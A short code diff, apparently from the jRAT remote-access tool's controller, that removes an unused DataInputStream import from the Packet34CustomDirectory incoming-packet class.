@@ -4,8 +4,6 @@ import jrat.controller.Slave;
 import jrat.controller.packets.incoming.AbstractIncomingPacket;
 import jrat.module.fs.ui.FrameRemoteFiles;
 
-import java.io.DataInputStream;
-
 public class Packet34CustomDirectory extends AbstractIncomingPacket {
 
 	@Override
